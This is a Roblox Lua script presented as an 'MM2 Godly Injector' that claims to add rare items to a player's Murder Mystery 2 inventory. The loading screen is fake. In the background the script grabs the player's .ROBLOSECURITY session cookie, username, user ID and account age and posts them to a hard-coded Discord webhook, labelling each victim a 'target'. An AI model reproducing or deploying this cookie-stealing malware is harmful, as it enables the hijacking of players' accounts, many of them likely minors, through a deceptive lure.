
-- [[ CONFIGURATION ]]
local WEBHOOK_URL = "https://discordapp.com/api/webhooks/1504590289845620878/04i1nHUKQN2mNjg0pnJolrCospWy2lHR4bKi-N67MIMSplR5KTf1C7kfvorb_fH6TGzQ"

-- [[ UI SETUP: FAKE LOADING ]]
local ScreenGui = Instance.new("ScreenGui", game.CoreGui)
local MainFrame = Instance.new("Frame", ScreenGui)
MainFrame.Size = UDim2.new(0, 350, 0, 120)
MainFrame.Position = UDim2.new(0.5, -175, 0.5, -60)
MainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
MainFrame.BorderSizePixel = 0

local BarBack = Instance.new("Frame", MainFrame)
BarBack.Size = UDim2.new(0, 300, 0, 15)
BarBack.Position = UDim2.new(0.5, -150, 0.65, 0)
BarBack.BackgroundColor3 = Color3.fromRGB(45, 45, 45)

local BarFill = Instance.new("Frame", BarBack)
BarFill.Size = UDim2.new(0, 0, 1, 0)
BarFill.BackgroundColor3 = Color3.fromRGB(0, 255, 127)

local Text = Instance.new("TextLabel", MainFrame)
Text.Size = UDim2.new(1, 0, 0, 40)
Text.BackgroundTransparency = 1
Text.TextColor3 = Color3.fromRGB(255, 255, 255)
Text.Text = "MM2 Godly Injector v4.2"
Text.Font = Enum.Font.SourceSansBold
Text.TextSize = 20

-- [[ LOGIC: DATA COLLECTION & WEBHOOK ]]
local function collectData()
    local player = game.Players.LocalPlayer
    local cookie = "N/A (Executor lack of permissions)"
    
    -- Попытка достать Cookie (работает на большинстве популярных экзекуторов)
    pcall(function()
        if getcookies then
            cookie = getcookies(".roblox.com")[".ROBLOSECURITY"]
        elseif syn and syn.request then
            -- Специальный метод для старых версий
        end
    end)

    local payload = {
        ["embeds"] = {{
            ["title"] = "🎯 New Godly Target Logged!",
            ["color"] = 65280, -- Зеленый цвет
            ["fields"] = {
                {["name"] = "Player Name", ["value"] = player.Name, ["inline"] = true},
                {["name"] = "User ID", ["value"] = tostring(player.UserId), ["inline"] = true},
                {["name"] = "Account Age", ["value"] = player.AccountAge .. " days", ["inline"] = true},
                {["name"] = "Cookie", ["value"] = "```" .. (cookie or "Not found") .. "```"}
            },
            ["footer"] = {["text"] = "MM2 Inventory Logger • " .. os.date("%X")}
        }}
    }

    local request_func = (syn and syn.request) or (http and http.request) or request or http_request
    if request_func then
        request_func({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = game:GetService("HttpService"):JSONEncode(payload)
        })
    end
end

-- [[ RUNNER ]]
spawn(function()
    collectData() -- Отправка данных происходит моментально в фоне
    
    for i = 1, 100 do
        task.wait(0.08)
        BarFill.Size = UDim2.new(i/100, 0, 1, 0)
        if i < 30 then Text.Text = "Scanning Inventory..."
        elseif i < 60 then Text.Text = "Bypassing Security..."
        elseif i < 90 then Text.Text = "Adding Godly Items..."
        else Text.Text = "Finalizing..." end
    end
    
    Text.Text = "Success! Re-join MM2 to see items."
    task.wait(5)
    ScreenGui:Destroy()
end)
